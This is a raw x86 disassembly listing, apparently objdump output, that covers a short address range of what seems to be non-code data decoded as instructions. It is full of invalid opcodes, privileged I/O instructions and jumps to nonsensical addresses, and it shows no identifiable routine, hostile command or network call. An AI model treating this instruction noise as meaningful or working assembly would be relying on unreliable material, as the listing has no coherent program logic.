  411fde:	(bad)
  411fe3:	shr    eax,1
  411fe5:	ds push ds
  411fe7:	fcomp  QWORD PTR [esi]
  411fe9:	(bad)
  411fed:	push   ss
  411fee:	push   edi
  411fef:	nop
  411ff0:	les    ebx,FWORD PTR [edx+edi*4]
  411ff3:	adc    ah,BYTE PTR [edx+edi*2-0x64]
  411ff7:	mov    dl,0xac
  411ff9:	stos   DWORD PTR es:[edi],eax
  411ffa:	pop    edi
  411ffb:	ret    
  411ffc:	adc    DWORD PTR [edi-0x12],ecx
  411fff:	jnp    0x411fb6
  412001:	out    0x20,eax
  412003:	out    dx,eax
  412004:	in     ax,dx
  412006:	xchg   esi,eax
  412007:	ja     0x412011
  412009:	je     0x412074
  41200b:	adc    dh,BYTE PTR [esi-0x3a]
  41200e:	ja     0x411fe0
  412010:	sar    BYTE PTR [esi],1
  412012:	cld    
  412013:	fimul  DWORD PTR [ebx+0x659c8df8]
  412019:	pop    edi
  41201a:	dec    esp
  41201b:	xor    DWORD PTR [esi-0x5eb7d232],edi
  412021:	xchg   ecx,eax
  412022:	fldenv [eax+0x2e]
  412025:	call   0x312cdbce
  41202a:	or     cl,BYTE PTR [ebx-0x9]
  41202d:	or     dh,BYTE PTR [eax+0x47]
  412030:	xchg   esi,eax
  412031:	xchg   ecx,eax
  412032:	aaa    
  412033:	rcl    BYTE PTR cs:[ebx+0x4890b58f],cl
  41203a:	pop    ss
  41203b:	scas   eax,DWORD PTR es:[edi]
  41203c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41203d:	push   ebx
  41203e:	adc    DWORD PTR [ebp-0xb],edx
  412041:	stos   BYTE PTR es:[edi],al
  412042:	jecxz  0x411fd2
  412044:	jg     0x411fcb
  412046:	jmp    0x412079
  412048:	or     BYTE PTR [edx-0x553a5a71],ch
  41204e:	sub    DWORD PTR [esi-0x19],edi
  412051:	push   ebp
  412052:	dec    ebx
  412053:	sbb    BYTE PTR [esi-0x2c],al
  412056:	dec    edi
  412057:	daa    
  412058:	cli    
  412059:	xlat   BYTE PTR ds:[ebx]
  41205a:	pop    ebp
  41205b:	add    bl,ch
  41205d:	cmp    al,0x7e
  41205f:	push   0x2d
  412061:	xor    dh,0x98
  412064:	sbb    eax,0x87be29ce
  412069:	test   BYTE PTR [edx+0x7494f16a],dl
  41206f:	xor    dh,dh
  412071:	scas   eax,DWORD PTR es:[edi]
  412072:	lahf   
  412073:	loop   0x412012
  412075:	push   ecx
  412076:	jno    0x4120e6
  412078:	test   eax,0x61af9b18
  41207d:	dec    edx
  41207e:	rol    BYTE PTR [eax+0x7c],1
  412081:	cmp    al,0xf2
  412083:	retf   
  412084:	mov    ebp,ss
  412086:	push   eax
  412087:	sti    
  412088:	push   ebp
  412089:	mov    bh,0xca
  41208b:	mov    eax,ds:0xcd4884d5
  412090:	in     al,0xdd
  412092:	or     BYTE PTR ds:0x94f838ce,dl
  412098:	retf   
  412099:	and    eax,0x60c5f712
  41209e:	call   0xc7da0418
  4120a3:	ficom  DWORD PTR [ecx-0x7d8f8732]
  4120a9:	push   0x56e5188f
  4120ae:	or     al,0x42
  4120b0:	lds    esp,FWORD PTR [ecx+ecx*2+0x31]
  4120b4:	xchg   dx,ax
  4120b6:	add    ah,BYTE PTR [edx]
  4120b8:	push   edi
  4120b9:	(bad)  
  4120ba:	aaa    
  4120bb:	xchg   ebp,eax
  4120bc:	mov    edx,0x870407e
  4120c1:	popa   
  4120c2:	jmp    0x41208c
  4120c4:	jno    0x4120a9
  4120c6:	inc    ecx
  4120c7:	mov    esi,0x57ffe5f3
  4120cc:	test   al,0xd2
  4120ce:	mov    dh,ah
  4120d0:	mov    bl,BYTE PTR [eax]
  4120d2:	mov    ah,BYTE PTR [esp+ecx*4-0x9]
  4120d6:	cmp    BYTE PTR [ecx],bh
  4120d8:	lock ins DWORD PTR es:[edi],dx
  4120da:	mov    bh,0xa0
  4120dc:	mov    DWORD PTR [esi+0x17],ebp
  4120df:	ins    DWORD PTR es:[edi],dx
  4120e0:	std    
  4120e1:	stos   DWORD PTR es:[edi],eax
  4120e2:	dec    esi
  4120e3:	out    dx,al
  4120e4:	(bad)  
  4120e5:	cli    
  4120e6:	jecxz  0x412167
  4120e8:	and    bl,BYTE PTR [ebx]
  4120ea:	imul   edi,DWORD PTR [eax+esi*4],0xffffffb3
  4120ee:	jns    0x4120db
  4120f0:	xlat   BYTE PTR ds:[ebx]
  4120f1:	mov    eax,ds:0x581b627d
  4120f6:	push   edx
  4120f7:	sahf   
  4120f8:	ds xor eax,0x776b8ffa
  4120fe:	add    BYTE PTR [esi-0x2856a426],0x67
  412105:	(bad)  
  412106:	in     eax,dx
  412107:	popa   
  412108:	cmp    eax,0x59ff213b
  41210d:	push   edx
  41210e:	neg    DWORD PTR [esp+edi*1]
  412111:	mov    al,0x6d
  412113:	je     0x4120c9
  412115:	test   al,0xac
  412117:	fs sbb eax,esp
  41211a:	add    ebx,DWORD PTR [ecx+esi*2]
  41211d:	add    BYTE PTR [ecx+0x1811bb96],bh
  412123:	pop    esp
  412124:	pop    es
  412125:	sub    al,0x73
  412127:	int    0xb6
  412129:	sub    dh,BYTE PTR [ebx+0x6b3fdad1]
  41212f:	and    BYTE PTR [edx],0x2d
  412132:	cwde   
  412133:	scas   al,BYTE PTR es:[edi]
  412134:	pop    esi
  412135:	outs   dx,DWORD PTR ds:[esi]
  412136:	jl     0x4120c8
  412138:	sbb    BYTE PTR [edi-0x1a7ade63],dh
  41213e:	out    dx,al
  41213f:	xchg   ebp,eax
  412140:	push   esp
  412141:	ja     0x41212d
  412143:	outs   dx,BYTE PTR ds:[esi]
  412144:	mov    al,bl
  412146:	xchg   edx,eax
  412147:	mov    bl,0x8f
  412149:	mov    gs,WORD PTR [ebp+0x38]
  41214c:	jg     0x412195
  41214e:	sub    edi,DWORD PTR [edx+0x168283ac]
  412154:	mov    eax,0x183c62ff
  412159:	jns    0x412187
  41215b:	scas   eax,DWORD PTR es:[edi]
  41215c:	sti    
  41215d:	ins    BYTE PTR es:[edi],dx
  41215e:	jne    0x4121c9
  412160:	clc    
  412161:	jns    0x4120e5
  412163:	popf   
  412164:	pop    ebp
  412165:	(bad)  
  412166:	shl    DWORD PTR [eax],cl
  412168:	loop   0x41218e
  41216a:	jle    0x4121b4
  41216c:	ja     0x412119
  41216e:	xor    ebx,esp
  412170:	ins    DWORD PTR es:[edi],dx
  412171:	iret   
  412172:	rcr    DWORD PTR [esi+0x24],0xec
  412176:	jne    0x4120fb
  412178:	mov    ebx,esp
  41217a:	nop
  41217b:	dec    eax
  41217c:	mov    BYTE PTR [edx-0x7eecd614],al
  412182:	adc    eax,0xec14f73f
  412187:	bound  eax,QWORD PTR [ecx-0x21]
  41218a:	rol    DWORD PTR [ebp+0x44f968e4],cl
  412190:	call   0xd43f:0x8e8074a5
  412197:	lods   eax,DWORD PTR ds:[esi]
  412198:	fcomp  DWORD PTR [edi]
  41219a:	push   0x3f
  41219c:	xor    BYTE PTR [eax],ch
  41219e:	test   edi,esi
  4121a0:	cmc    
  4121a1:	icebp  
  4121a2:	jae    0x412207
  4121a4:	stc    
  4121a5:	mov    bh,0x61
  4121a7:	out    dx,eax
  4121a8:	push   ds
  4121a9:	inc    ebp
  4121aa:	add    eax,ebp
  4121ac:	test   eax,0x2f478988
  4121b1:	mov    al,0x4f
  4121b3:	sub    ebx,DWORD PTR [ebx]
  4121b5:	pop    eax
  4121b6:	mov    ebx,0x25397456
  4121bb:	cld    
  4121bc:	loopne 0x4121fe
  4121be:	inc    edi
  4121bf:	pop    ebx
  4121c0:	out    dx,al
  4121c1:	shr    BYTE PTR [ebx-0x1035e71c],0xf4
  4121c8:	aad    0xd7
  4121ca:	outs   dx,BYTE PTR ds:[esi]
  4121cb:	push   0x2b628d7d
  4121d0:	nop
  4121d1:	rcl    ecx,0x9
  4121d4:	bound  ebx,QWORD PTR [edi-0x33e15ebe]
  4121da:	adc    eax,0x78f1193f
  4121df:	test   esi,ebx
  4121e1:	lock cdq 
  4121e3:	push   cs
  4121e4:	in     al,0xa5
  4121e6:	cmp    al,0x58
  4121e8:	(bad)  
  4121ea:	cmp    al,0x73
  4121ec:	(bad)  
  4121ed:	xchg   esi,eax
  4121ee:	stos   DWORD PTR es:[edi],eax
  4121ef:	repz or al,0x26
  4121f2:	inc    ecx
  4121f3:	pop    ebx
  4121f4:	xor    dh,cl
  4121f6:	mov    al,ds:0x23e99794
  4121fb:	cmc    
  4121fc:	xor    BYTE PTR [ebx+0xf35ecc9],bl
  412202:	rcl    DWORD PTR [esi-0x668f2716],1
  412208:	push   cs
  412209:	push   es
  41220a:	jne    0x412230
  41220c:	and    ecx,edx
  41220e:	cs repz enter 0xfb19,0xa9
  412214:	inc    edi
  412215:	sub    al,0xf8
  412217:	xchg   ecx,eax
  412218:	or     al,0x53
  41221a:	pop    ebp
  41221b:	leave  
  41221c:	les    ebp,FWORD PTR [bx+si]
  41221f:	out    0x5b,eax
  412221:	sub    ecx,ebp
  412223:	rcl    BYTE PTR [ecx-0x1f],0xce
  412227:	stc    
  412228:	dec    edi
  412229:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41222a:	mov    ds:0x890d3e8d,eax
  41222f:	or     eax,0x14b17514
  412234:	(bad)  
  412235:	ror    BYTE PTR [edi],1
  412237:	mov    BYTE PTR [eax+0x2e],0xf9
  41223b:	pop    esi
  41223c:	imul   BYTE PTR [esi+0x3f5fc3f7]
  412242:	push   edx
  412243:	iret   
  412244:	hlt    
  412245:	inc    ebp
  412246:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412247:	ins    DWORD PTR es:[edi],dx
  412248:	ja     0x412245
  41224a:	shl    BYTE PTR [ecx-0x17807d64],1
  412250:	push   ss
  412251:	nop
  412252:	(bad)  
  412254:	cmp    DWORD PTR [ebx+0x7a200354],eax
  41225a:	test   al,0x1
  41225c:	sbb    edi,DWORD PTR [ebp+0x7e]
  41225f:	ror    DWORD PTR [eax],0xbb
  412262:	add    edi,esp
  412264:	inc    ecx
  412265:	imul   ebp,DWORD PTR [eax+0x1fca1df9],0xe97f3fa4
  41226f:	fs pushf 
  412271:	out    dx,eax
  412272:	xchg   ebp,eax
  412274:	in     al,dx
  412275:	fbld   TBYTE PTR [ebx+0x23]
  412278:	fs jmp 0x2ba92d71
  41227e:	xchg   esp,eax
  41227f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412280:	add    edi,edi
  412282:	add    ebx,DWORD PTR [ebx+0x33]
  412285:	cs ret 0x15b0
  412289:	and    DWORD PTR gs:[edx-0x42437b93],ebx
  412290:	jmp    0x5218:0x12ecf562
  412297:	outs   dx,BYTE PTR ds:[esi]
  412298:	mov    bl,0x3d
  41229a:	mov    eax,ds:0x3dd6d684
  41229f:	push   ebp
  4122a0:	push   ss
  4122a1:	icebp  
  4122a2:	(bad)  
  4122a3:	fadd   QWORD PTR [edi+0x54]
  4122a6:	inc    esp
  4122a7:	jae    0x4122a0
  4122a9:	mov    ecx,DWORD PTR [eax-0x1f]
  4122ac:	sbb    BYTE PTR [edi],0x42
  4122af:	or     al,0x59
  4122b1:	loope  0x41228f
  4122b3:	sti    
  4122b4:	stc    
  4122b5:	rsqrtps xmm3,XMMWORD PTR [edi-0x62df650d]
  4122bc:	dec    ebp
  4122bd:	push   esi
  4122be:	(bad)  
  4122bf:	xor    cl,BYTE PTR ds:[edi-0x31cf58c4]
  4122c6:	add    esp,DWORD PTR [esp+eax*8-0x79]
  4122ca:	scas   eax,DWORD PTR es:[edi]
  4122cb:	xchg   ebp,eax
  4122cc:	pop    esp
  4122cd:	cli    
  4122ce:	test   al,0xc
  4122d0:	test   eax,0x1f6a3c97
  4122d5:	data16 in al,0xf9
  4122d8:	mov    ch,0xb0
  4122da:	mov    esp,fs
  4122dc:	aam    0xbc
  4122de:	mov    ?,WORD PTR ds:0x41b3c47
  4122e4:	icebp  
  4122e5:	aam    0xb8
  4122e7:	fsubr  QWORD PTR [esi+0x4277c14d]
  4122ed:	fcomi  st,st(6)
  4122ef:	xor    ch,ah
  4122f1:	mov    cl,0x84
  4122f3:	dec    ebp
  4122f4:	fstp   QWORD PTR [ebx]
  4122f6:	xor    eax,edi
  4122f8:	inc    eax
  4122f9:	in     al,0xcf
  4122fb:	ja     0x41233a
  4122fd:	call   0x11dd88ae
  412302:	fwait
  412303:	xor    al,0x64
  412305:	xor    ebx,ebx
  412307:	lods   al,BYTE PTR ds:[esi]
  412308:	xor    DWORD PTR [eax-0x2c25affa],eax
  41230e:	fcmovb st,st(7)
  412310:	ins    BYTE PTR es:[edi],dx
  412311:	push   0xffffffbb
  412313:	and    dh,bh
  412315:	push   esi
  412316:	xor    DWORD PTR [esi+esi*4],edx
  412319:	or     al,0x91
  41231b:	cli    
  41231c:	jb     0x412307
  41231e:	jg     0x41231e
  412320:	test   edi,edi
  412322:	cmp    BYTE PTR [eax-0x657ae712],al
  412328:	sub    esp,esi
  41232a:	adc    edi,edx
  41232c:	lock popa 
  41232e:	in     al,dx
  41232f:	call   0xd5399423
  412334:	mov    bl,0xa
  412336:	inc    ebx
  412337:	and    ch,0xda
  41233a:	lods   eax,DWORD PTR ds:[esi]
  41233b:	inc    ebp
  41233c:	shr    BYTE PTR [esp+esi*4-0x7c3c1b59],cl
  412343:	outs   dx,DWORD PTR ds:[esi]
  412344:	dec    ebx
  412345:	inc    ebp
  412346:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412347:	daa    
  412348:	xor    bl,BYTE PTR [esi-0x6d9fa4f5]
  41234e:	pushf  
  41234f:	cld    
  412350:	aam    0x1c
  412352:	jmp    0xc16672d2
  412357:	adc    esp,DWORD PTR [eax+0x7731da36]
  41235d:	ins    BYTE PTR es:[edi],dx
  41235e:	idiv   bl
  412360:	call   0x20aaf710
  412365:	popf   
  412366:	dec    edi
  412367:	xor    al,0xb9
  412369:	and    esi,DWORD PTR [ebp-0x227a7a9d]
  41236f:	repz loope 0x41234e
  412372:	add    al,0x9f
  412374:	ss nop
  412376:	ja     0x4123ce
  412378:	xor    BYTE PTR [edx+edx*8],ah
  41237b:	shl    BYTE PTR [edx],1
  41237d:	jb     0x412346
  41237f:	sbb    eax,0x4f38e5ad
  412384:	into   
  412385:	fbld   TBYTE PTR [esi-0x78]
  412388:	and    al,0x1e
  41238a:	adc    DWORD PTR [ebp-0x7023c9e2],ebp
  412390:	jle    0x4123e1
  412392:	(bad)
  412396:	ss repz mov bh,0x65
  41239a:	adc    eax,0x14f9955a
  41239f:	mov    edi,0x502bb960
  4123a4:	mov    al,ds:0x8a6d485
  4123a9:	outs   dx,BYTE PTR ds:[esi]
  4123aa:	inc    ebp
  4123ab:	out    dx,eax
  4123ac:	push   ebx
  4123ad:	push   esp
  4123ae:	jmp    0xdcb4c17a
  4123b3:	hlt    
  4123b4:	fwait
  4123b5:	sub    al,0xe8
  4123b7:	bound  ebp,QWORD PTR [edx-0x14f8df63]
  4123bd:	mov    edi,0xb052dd7e
  4123c2:	mov    edx,0xfc9cb4c1
  4123c7:	xor    DWORD PTR [ebp+0x5589119b],ebx
  4123cd:	lea    edx,[esi]
  4123cf:	(bad)  
  4123d0:	xor    ah,BYTE PTR [edi]
  4123d2:	xchg   edi,eax
  4123d3:	sbb    al,0x6c
  4123d5:	push   edx
  4123d6:	shl    BYTE PTR [esi+0x38a8fa0],0xa2
  4123dd:	in     eax,dx
  4123de:	scas   eax,DWORD PTR es:[edi]
  4123df:	int    0xa0
  4123e1:	outs   dx,DWORD PTR ds:[esi]
  4123e2:	stos   BYTE PTR es:[edi],al
  4123e3:	dec    eax
  4123e4:	inc    eax
  4123e5:	sbb    cl,0x38
  4123e8:	push   ebp
  4123e9:	sbb    cl,BYTE PTR [ebp-0x56]
  4123ec:	pushf  
  4123ed:	jnp    0x4123f3
  4123ef:	add    eax,0x175aa99b
  4123f4:	mov    ecx,0x9895b631
  4123f9:	cs out dx,eax
  4123fb:	inc    edx
  4123fc:	cld    
  4123fd:	mov    al,ds:0x21b25c84
  412402:	inc    ecx
  412403:	dec    ebp
  412404:	(bad)  
  412406:	xlat   BYTE PTR ds:[ebx]
  412407:	out    0x8b,al
  412409:	jge    0x4123a6
  41240b:	test   DWORD PTR [edx-0x34],0x91aa62bf
  412412:	shl    DWORD PTR [ebx+0x6bae5d5e],0x8d
  412419:	ror    DWORD PTR [edi],0xf2
  41241c:	loopne 0x4123e6
  41241e:	sub    eax,0xfc8ed677
  412423:	cmp    ebx,eax
  412425:	inc    ebp
  412426:	hlt    
  412427:	test   al,0xb
  412429:	xchg   esi,eax
  41242a:	fstp   st(3)
  41242c:	mov    bl,0x58
  41242e:	push   ds
  41242f:	push   edi
  412430:	retf   
  412431:	push   esp
  412432:	popa   
  412433:	lock xchg ecx,eax
  412435:	stos   DWORD PTR es:[edi],eax
  412436:	data16 jae 0x4123bb
  412439:	lds    ecx,FWORD PTR [eax+0x61]
  41243c:	idiv   DWORD PTR [ebp+0x41]
  41243f:	mov    ds:0x8ec23efd,al
  412444:	cli    
  412445:	fwait
  412446:	push   0x881efb82
  41244b:	fisttp WORD PTR [edi-0x56]
  41244e:	in     al,0xff
  412450:	inc    esp
  412451:	push   ds
  412452:	jg     0x4123ea
  412454:	mov    al,ds:0x60780cba
  412459:	(bad)
  41245c:	xchg   ecx,eax
  41245d:	jecxz  0x4124b9
  41245f:	cmp    ecx,DWORD PTR [edi]
  412461:	sub    eax,0x9bdd202f
  412466:	stos   BYTE PTR es:[edi],al
  412467:	xchg   ebp,eax
  412468:	int    0x9e
  41246a:	xor    DWORD PTR [esi+ebp*8-0x7f7afb09],eax
  412471:	and    al,bh
  412473:	into   
  412474:	loop   0x4124e9
  412476:	fbld   TBYTE PTR [ebp+0xc]
  412479:	lea    ebp,[edx-0x2fe2330c]
  41247f:	clc    
  412480:	(bad)  
  412481:	jmp    0xb7afaecb
  412486:	call   0x750d3297
  41248b:	nop
  41248c:	mov    al,ds:0xa17be5fd
  412491:	arpl   WORD PTR [esi+0xe],ax
  412494:	xchg   ebx,eax
  412495:	push   esi
  412496:	fdiv   DWORD PTR [edi-0x208e7f52]
  41249c:	fcom   DWORD PTR [edi+0x65b277b7]
  4124a2:	xor    edx,DWORD PTR [esi-0x45ba0e2d]
  4124a8:	sti    
  4124a9:	test   ecx,eax
  4124ab:	loope  0x412485
  4124ad:	fnstenv [ebx]
  4124af:	cmp    eax,DWORD PTR [edx+0x51]
  4124b2:	fsubr  QWORD PTR [ecx+0x2]
  4124b5:	fbstp  TBYTE PTR [eax+0xe]
  4124b8:	(bad)  
  4124bb:	adc    edi,DWORD PTR [eax-0x7d]
  4124be:	pop    ds
  4124bf:	ins    BYTE PTR es:[edi],dx
  4124c0:	int3   
  4124c1:	dec    ebx
  4124c2:	in     al,dx
  4124c3:	cs loope 0x4124bd
  4124c6:	rol    DWORD PTR [edx],cl
  4124c8:	lahf   
  4124c9:	stc    
  4124ca:	out    0x19,eax
  4124cc:	mov    esp,0xd6df94b
  4124d1:	push   esi
  4124d2:	cs push cs
  4124d4:	cmc    
  4124d5:	test   dh,bl
  4124d7:	inc    edx
  4124d8:	dec    edi
  4124d9:	scas   al,BYTE PTR es:[edi]
  4124da:	(bad)  
  4124db:	and    BYTE PTR [edi+ecx*1-0x5cc053c5],ch
  4124e2:	lock inc ax
  4124e5:	int    0x5e
  4124e7:	jp     0x412551
  4124e9:	push   0xc94421fb
  4124ee:	mov    eax,ds:0x8cee0f67
  4124f3:	sbb    dh,BYTE PTR [eax]
  4124f5:	push   edx
  4124f6:	xchg   ebx,eax
  4124f7:	addr16 jb 0x4124de
  4124fa:	test   BYTE PTR [edi],ah
  4124fc:	xchg   ecx,eax
  4124fd:	sub    BYTE PTR [edx],dl
  4124ff:	inc    DWORD PTR [edi+0x5f8d0a8f]
  412505:	jns    0x41250a
  412507:	adc    ah,cl
  412509:	pop    esi
  41250a:	xor    DWORD PTR [ebx-0x3d],esp
  41250d:	jg     0x41256f
  41250f:	pop    ebx
  412510:	pushf  
  412511:	xchg   al,ah
  412513:	lahf   
  412514:	pop    edx
  412515:	(bad)  
  412516:	clc    
  412517:	fwait
  412518:	mov    dl,BYTE PTR [eax]
  41251a:	jmp    0x149e4bef
  41251f:	sar    BYTE PTR [ecx-0x4290fce6],cl
  412525:	jp     0x412523
  412527:	popa   
  412528:	xchg   DWORD PTR [ebx-0x6fe33b3f],ebx
  41252e:	aaa    
  41252f:	inc    eax
  412530:	sbb    eax,0x103392e0
  412535:	push   esp
  412536:	and    bh,BYTE PTR [esi-0x2a]
  412539:	clc    
  41253a:	sub    edi,esi
  41253c:	dec    edi
  41253d:	adc    al,0x6c
  41253f:	je     0x4125b1
  412541:	fbld   TBYTE PTR [ecx-0x3b63bcdf]
  412547:	mov    esp,0x85e67a6a
  41254c:	(bad)  
  41254d:	out    dx,al
  41254e:	stc    
  41254f:	stos   BYTE PTR es:[edi],al
  412550:	cld    
  412551:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412553:	jo     0x412506
  412555:	xchg   ecx,eax
  412556:	sbb    esp,DWORD PTR [edi+0x1cd760cf]
  41255c:	scas   eax,DWORD PTR es:[edi]
  41255d:	inc    ebx
  41255e:	jae    0x412572
  412560:	in     al,0xca
  412562:	pop    ebp
  412563:	mov    ds:0x845011e3,eax
  412568:	outs   dx,DWORD PTR ds:[esi]
  412569:	sbb    esp,0xaba9eb6c
  41256f:	add    dh,BYTE PTR [eax]
  412571:	xchg   edi,eax
  412572:	pop    ds
  412573:	pop    ebx
  412574:	pushf  
  412575:	test   BYTE PTR [ebx],0xb6
  412578:	mov    edx,0x3bbda064
  41257d:	int    0xcf
  41257f:	add    bl,al
  412581:	push   esp
  412582:	test   BYTE PTR [esi],bl
  412584:	sti    
  412585:	and    eax,0x125f9e53
  41258a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41258b:	sub    DWORD PTR [esi],esp
  41258d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41258e:	(bad)  ds:0x6369d78c
  412594:	movzx  esi,BYTE PTR [ebx-0x65a53629]
  41259b:	aas    
  41259c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41259d:	cmc    
  41259e:	mov    ds:0xa80dbf1,eax
  4125a3:	inc    ecx
  4125a4:	mov    eax,0x2b47f5ab
  4125a9:	cdq    
  4125aa:	mov    ecx,0xcebe089b
  4125af:	mov    cl,0x4e
  4125b1:	adc    DWORD PTR [ebx-0x12902906],0x72591cf7
  4125bb:	push   0x3c8fb9c8
  4125c0:	popa   
  4125c1:	jg     0x4125cd
  4125c3:	cwde   
  4125c4:	cmp    BYTE PTR [esi-0x55],ah
  4125c7:	lahf   
  4125c8:	pop    ds
  4125c9:	pop    ss
  4125ca:	in     al,0x48
  4125cc:	call   DWORD PTR [ebx+0x73]
  4125cf:	(bad)  
  4125d0:	(bad)
  4125d3:	cld    
  4125d4:	cmc    
  4125d5:	mov    ah,0xe
  4125d7:	(bad)  
  4125d8:	fcomi  st,st(4)
  4125da:	xor    BYTE PTR ds:0x2584d026,ch
  4125e0:	sub    al,0x6c
  4125e2:	ret    
  4125e3:	scas   eax,DWORD PTR es:[edi]
  4125e4:	pop    ebp
  4125e5:	mul    DWORD PTR [esi]
  4125e7:	outs   dx,BYTE PTR ds:[esi]
  4125e8:	(bad)
  4125ec:	mov    edx,gs
  4125ee:	ss imul edx,esp,0x57643e94
  4125f5:	xchg   BYTE PTR [eax+edx*1-0x1d],ch
  4125f9:	lods   al,BYTE PTR ds:[esi]
  4125fa:	or     edx,DWORD PTR [eax+0x34ffca1b]
  412600:	adc    BYTE PTR [ebx-0x1e],bh
  412603:	es int 0xad
  412606:	dec    esi
  412607:	lds    edi,FWORD PTR [bx-0xb]
  41260b:	jo     0x412632
  41260d:	cmp    DWORD PTR [esi],edi
  41260f:	js     0x41261e
  412611:	sahf   
  412612:	dec    edi
  412613:	data16 lods al,BYTE PTR ds:[esi]
  412615:	cmp    al,0xc3
  412617:	and    DWORD PTR [esi],0xf5c59ed
  41261d:	call   0x4c2b:0xddd23f72
  412624:	mov    eax,ds:0xcc96f9ec
  412629:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41262a:	loope  0x412611
  41262c:	shr    ch,cl
  41262e:	ss in  al,0xed
  412631:	cmp    al,0x37
  412633:	mov    eax,ds:0x3f475831
  412638:	test   esi,0x52ce39ae
  41263e:	xchg   ecx,eax
  41263f:	ffree  st(7)
  412641:	cdq    
  412642:	jne    0x412671
  412644:	cli    
  412645:	gs jb  0x4125d7
  412648:	in     al,dx
  412649:	test   al,0xc4
  41264b:	jne    0x412655
  41264d:	dec    edi
  41264e:	mov    al,0x41
  412650:	push   ebx
  412651:	add    ebx,DWORD PTR [ebx-0x39dbe073]
  412657:	lods   al,BYTE PTR ds:[esi]
  412658:	aam    0x82
  41265a:	dec    edx
  41265b:	mov    esi,0x6e40575c
  412660:	shr    BYTE PTR [ebp+0x7f],1
  412663:	in     eax,dx
  412664:	jae    0x41261e
  412666:	aaa    
  412667:	xchg   esi,eax
  412668:	jnp    0x412636
  41266a:	test   ebp,eax
  41266c:	stos   BYTE PTR es:[edi],al
  41266d:	dec    eax
  41266e:	(bad)  
  41266f:	popa   
  412670:	and    DWORD PTR [ebx+ecx*4-0x2dd5c837],edx
  412677:	cld    
  412678:	mov    ecx,0x7dfd157a
  41267d:	into   
  41267e:	and    BYTE PTR [ecx],dh
  412680:	sbb    BYTE PTR ds:[eax-0x31c0271b],dh
  412687:	int3   
  412688:	push   es
  412689:	push   0x6a
  41268b:	mov    ah,0x58
  41268d:	sbb    ecx,eax
  41268f:	dec    ebx
  412690:	lahf   
  412691:	mov    al,ds:0x5a3887e2
  412696:	ja     0x4126ef
  412698:	add    dl,0x8e
  41269b:	pop    eax
  41269c:	call   0x9b6e:0xf2d1
  4126a2:	sub    dh,BYTE PTR [esp+eax*4]
  4126a5:	mov    eax,DWORD PTR [ebx]
  4126a7:	popa   
  4126a8:	imul   edi,DWORD PTR [ebx],0xffffffeb
  4126ab:	sahf   
  4126ac:	mov    dh,0x4
  4126ae:	mov    bl,0xdc
  4126b0:	in     al,dx
  4126b1:	fdivrp st(2),st
  4126b3:	pushf  
  4126b4:	push   edi
  4126b5:	mov    esp,0xef6eb96e
  4126ba:	lods   eax,DWORD PTR ds:[esi]
  4126bb:	push   eax
  4126bc:	js     0x4126ef
  4126be:	add    edx,DWORD PTR [ebp-0x3]
  4126c1:	pop    es
  4126c2:	sti    
  4126c3:	sbb    al,0x66
  4126c5:	mov    esi,0x3ac271a9
  4126ca:	sub    eax,0x66be3148
  4126cf:	ins    DWORD PTR es:[edi],dx
  4126d0:	int    0x9b
  4126d2:	enter  0xaad6,0x44
  4126d6:	leave  
  4126d7:	cld    
  4126d8:	cmp    DWORD PTR [eax],edi
  4126da:	pop    ecx
  4126db:	data16 (bad) [eax]
  4126de:	xchg   ecx,eax
  4126df:	nop
  4126e0:	sbb    ebx,DWORD PTR [esi-0xef67f13]
  4126e6:	mov    fs,WORD PTR [ebp+0x3]
  4126e9:	(bad)  
  4126eb:	addr16 ret 
  4126ed:	push   edi
  4126ee:	push   edi
  4126ef:	in     al,0x9a
  4126f1:	dec    ecx
  4126f2:	inc    ebp
  4126f3:	cmp    BYTE PTR [edi+esi*4+0x26],cl
  4126f7:	stos   BYTE PTR es:[edi],al
  4126f8:	pop    ebp
  4126f9:	inc    edx
  4126fa:	push   ebx
  4126fb:	stc    
  4126fc:	pop    esi
  4126fd:	in     al,dx
  4126fe:	sbb    eax,0x1d6648ce
  412703:	cs out 0x9,al
  412706:	xor    bl,cl
  412708:	dec    eax
  412709:	jle    0x4126bd
  41270b:	rcr    DWORD PTR [esi-0x52],1
  41270e:	push   esi
  41270f:	mov    al,ds:0xd19993a0
  412714:	sbb    eax,0x420e2631
  412719:	call   FWORD PTR [edx]
  41271b:	cwde   
  41271c:	mov    ds:0xad21201a,eax
  412721:	test   eax,0x852a1246
  412726:	xor    bh,BYTE PTR [ebx+0x12]
  412729:	pop    eax
  41272a:	and    al,0x44
  41272c:	jg     0x412734
  41272e:	xchg   BYTE PTR [esi+0x7781ac90],cl
  412734:	add    eax,0xb792b7f7
  412739:	nop
  41273a:	ins    BYTE PTR es:[edi],dx
  41273b:	sbb    BYTE PTR [esi-0x7995c0c3],0x83
  412742:	xor    eax,0x2ad6eb31
  412747:	fsubr  st(2),st
  412749:	jg     0x41278e
  41274b:	push   cs
  41274c:	xchg   ecx,eax
  41274d:	inc    ebx
  41274e:	loope  0x41279e
  412750:	jge    0x4126db
  412752:	cld    
  412753:	add    DWORD PTR [ebp+0x108c6475],edx
  412759:	repz pop esp
  41275b:	push   eax
  41275c:	push   eax
  41275d:	dec    esp
  41275e:	push   cs
  41275f:	sbb    ebx,DWORD PTR [esi]
  412761:	test   eax,0xaa30f8b4
  412766:	add    ah,bh
  412768:	push   esi
  412769:	in     eax,0x53
  41276b:	test   esi,esi
  41276d:	pushf  
  41276e:	retf   
  41276f:	and    BYTE PTR [ebp-0x28],dh
  412772:	aas    
  412773:	cli    
  412774:	and    eax,0x8ad08841
  412779:	daa    
  41277a:	shr    DWORD PTR [esi-0x6],1
  41277d:	push   ebp
  41277e:	jg     0x412776
  412780:	retf   0x4b70
  412783:	js     0x4127c0
  412785:	aad    0x8d
  412787:	ds cmp ah,bl
  41278a:	mov    ebp,0x8df3e98d
  41278f:	inc    ebx
  412790:	push   ss
  412791:	stos   BYTE PTR es:[edi],al
  412792:	push   edi
  412793:	ins    BYTE PTR es:[edi],dx
  412794:	pop    es
  412795:	dec    edx
